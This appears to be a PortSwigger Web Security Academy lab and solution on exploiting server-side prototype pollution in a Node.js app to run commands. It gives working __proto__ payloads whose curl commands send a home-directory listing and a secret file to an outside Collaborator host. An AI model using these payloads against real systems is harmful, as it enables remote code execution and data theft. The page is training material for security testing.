# Lab: Exfiltrating sensitive data via server-side prototype pollution

Source: https://portswigger.net/web-security/prototype-pollution/server-side/lab-exfiltrating-sensitive-data-via-server-side-prototype-pollution
Fetched: 2026-06-28T09:17:59.078400+00:00

Web Security Academy

Prototype pollution

Server-side vulnerabilities

Lab

Lab: Exfiltrating sensitive data via server-side prototype pollution

This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.

Due to the configuration of the server, it's possible to pollute Object.prototype in such a way that you can inject arbitrary system commands that are subsequently executed on the server.

To solve the lab:

Find a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype.

Identify a gadget that you can use to inject and execute arbitrary system commands.

Trigger remote execution of a command that leaks the contents of Carlos's home directory (/home/carlos) to the public Burp Collaborator server.

Exfiltrate the contents of a secret file in this directory to the public Burp Collaborator server.

Submit the secret you obtain from the file using the button provided in the lab banner.

In this lab, you already have escalated privileges, giving you access to admin functionality. You can log in to your own account with the following credentials: wiener:peter

Note

When testing for server-side prototype pollution, it's possible to break application functionality or even bring down the server completely. If this happens to your lab, you can manually restart the server using the button provided in the lab banner. Remember that you're unlikely to have this option when testing real websites, so you should always use caution.

Solution

Study the address change feature

Log in and visit your account page. Submit the form for updating your billing and delivery address.

In Burp, go to the Proxy > HTTP history tab and find the POST /my-account/change-address request.

Observe that when you submit the form, the data from the fields is sent to the server as JSON. Notice that the server responds with a JSON object that appears to represent your user. This has been updated to reflect your new address information.

Send the request to Burp Repeater.

Identify a prototype pollution source

In Repeater, add a new property to the JSON with the name __proto__, containing an object with a json spaces property.

"__proto__": {

"json spaces":10

}

Send the request.

In the Response panel, switch to the Raw tab. Notice that the JSON indentation has increased based on the value of your injected property. This strongly suggests that you have successfully polluted the prototype.

Probe for remote code execution

Go to the admin panel and observe that there's a button for running maintenance jobs.

Click the button and observe that this triggers background tasks that cleanup the database and filesystem. This is a classic example of the kind of functionality that may spawn node child processes.

Try polluting the prototype with a set of malicious properties that control the options passed to the child_process.execSync() method. The injected command should trigger an interaction with the public Burp Collaborator server:

"__proto__": {

"shell":"vim",

"input":":! curl https://YOUR-COLLABORATOR-ID.oastify.com\n"

}

Send the request.

In the browser, go to the admin panel and trigger the maintenance jobs. Observe that, after a short delay, these fail to run.

In Burp, go to the Collaborator tab and poll for interactions. Observe that you have received several interactions. This confirms the remote code execution.

Leak the hidden file name

In Burp Repeater, modify the payload in your malicious input parameter to a command that leaks the contents of Carlos's home directory to the public Burp Collaborator server. The following is one approach for doing this:

"input":":! ls /home/carlos | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"

Send the request.

In the browser, go to the admin panel and trigger the maintenance jobs again.

Go to the Collaborator tab and poll for interactions.

Notice that you have received a new HTTP POST request with a Base64-encoded body.

Decode the contents of the body to reveal the names of two entries: node_apps and secret.

Exfiltrate the contents of the secret file

In Burp Repeater, modify the payload in your malicious input parameter to a command that exfiltrates the contents of the file /home/carlos/secret to the public Burp Collaborator server. The following is one approach for doing this:

"input":":! cat /home/carlos/secret | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"

Send the request.

In the browser, go to the admin panel and trigger the maintenance jobs again.

Go to the Collaborator tab and poll for interactions.

Notice that you have received a new HTTP POST request with a Base64-encoded body.

Decode the contents of the body to reveal the secret.

In your browser, go to the lab banner and click Submit solution. Submit the decoded secret to solve the lab.

Find prototype pollution vulnerabilities using Burp Suite

Try for free
